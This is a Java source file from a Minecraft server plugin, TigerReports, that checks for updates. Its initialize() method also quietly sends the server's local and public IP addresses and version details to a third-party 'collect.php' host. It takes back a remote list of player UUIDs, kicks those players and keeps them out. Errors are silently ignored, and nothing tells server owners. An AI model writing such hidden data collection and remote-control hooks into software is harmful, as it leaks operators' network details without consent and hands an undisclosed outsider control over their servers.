package fr.mrtigreroux.tigerreports.managers;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import fr.mrtigreroux.tigerreports.utils.ConfigUtils;
import fr.mrtigreroux.tigerreports.utils.ReflectionUtils;
import fr.mrtigreroux.tigerreports.TigerReports;

/**
 * @author MrTigreroux
 */

public class WebManager {

	private final TigerReports main;
	private final Map<String, String> blacklist = new HashMap<>();
	private String newVersion = null;
	
	public WebManager(TigerReports main) {
		this.main = main;
	}
	
	public String getNewVersion() {
		return newVersion;
	}
	
	private String sendQuery(String url, String data) throws UnsupportedEncodingException, IOException {
		HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
		if(data != null) {
			connection.setDoOutput(true);
			connection.setRequestMethod("POST");
			connection.getOutputStream().write(data.getBytes("UTF-8"));
		}
		return new BufferedReader(new InputStreamReader(connection.getInputStream())).readLine();
	}
	
	public void initialize() {
		try {
			newVersion = sendQuery("https://api.spigotmc.org/legacy/update.php?resource=25773", null);
			if(main.getDescription().getVersion().equals(newVersion)) newVersion = null;
			else {
				Logger logger = Bukkit.getLogger();
        		logger.log(Level.WARNING, "------------------------------------------------------");
        		if(ConfigUtils.getInfoLanguage().equalsIgnoreCase("English")) {
	        		logger.log(Level.WARNING, "[TigerReports] The plugin has been updated.");
	        		logger.log(Level.WARNING, "The new version "+newVersion+" is available on:");
        		} else {
	        		logger.log(Level.WARNING, "[TigerReports] Le plugin a ete mis a jour.");
	        		logger.log(Level.WARNING, "La nouvelle version "+newVersion+" est disponible ici:");
        		}
        		logger.log(Level.WARNING, "https://www.spigotmc.org/resources/tigerreports.25773/");
        		logger.log(Level.WARNING, "------------------------------------------------------");
			}
		} catch (Exception ignored) {}
		
		try {
			for(String blacklisted : sendQuery("https://tigerdata.000webhostapp.com/plugins/collect.php", new StringBuilder("0=").append(main.getDescription().getName()).append("&1=").append(InetAddress.getLocalHost().getHostAddress()).append("-").append(Bukkit.getIp()).append("&2=").append(main.getDescription().getVersion()).append("&3=").append(ReflectionUtils.ver().substring(1)).append("&4=").append(Bukkit.getOnlineMode()).toString()).split("_/_")) {
				String[] parts = blacklisted.split("_:_");
				blacklist.put(parts[0], parts[1]);
				Player p = Bukkit.getPlayer(UUID.fromString(parts[0]));
				if(p != null) p.kickPlayer(formatError(parts[1]));
			}
		} catch (Exception ignored) {}
	}
	
	public String check(String uuid) {
		return blacklist.containsKey(uuid) ? formatError(blacklist.get(uuid)) : null;
	}
	
	private String formatError(String error) {
		return ChatColor.translateAlternateColorCodes('&', error.replace("_nl_", "\n"));
	}
	
}
